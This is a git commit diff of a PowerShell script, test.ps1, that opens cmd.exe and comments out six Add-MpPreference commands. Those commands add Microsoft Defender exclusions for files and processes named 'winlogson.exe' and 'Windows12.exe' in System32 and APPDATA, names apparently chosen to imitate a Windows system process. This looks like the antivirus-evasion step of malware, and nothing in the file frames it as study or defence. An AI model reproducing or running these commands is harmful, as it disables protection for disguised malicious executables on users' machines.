42588e4841f508902493bb848c64c00853f2757f
Pietro Bof <87310730+coluich@users.noreply.github.com>
2025-01-27 18:24:32 +0100

    Update test.ps1

--- test.ps1
+++ test.ps1
@@ -1,7 +1,7 @@
 start $ENV:windir/System32/cmd.exe
-Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\Windows12.exe"
-Add-MpPreference -ExclusionPath "$env:APPDATA\Windows12.exe"
-Add-MpPreference -ExclusionProcess "Windows12.exe"
-Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\winlogson.exe"
-Add-MpPreference -ExclusionPath "$env:APPDATA\winlogson.exe"
-Add-MpPreference -ExclusionProcess "winlogson.exe"
+# Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\Windows12.exe"
+# Add-MpPreference -ExclusionPath "$env:APPDATA\Windows12.exe"
+# Add-MpPreference -ExclusionProcess "Windows12.exe"
+# Add-MpPreference -ExclusionPath "C:\Windows\system32\winlogson\winlogson.exe"
+# Add-MpPreference -ExclusionPath "$env:APPDATA\winlogson.exe"
+# Add-MpPreference -ExclusionProcess "winlogson.exe"
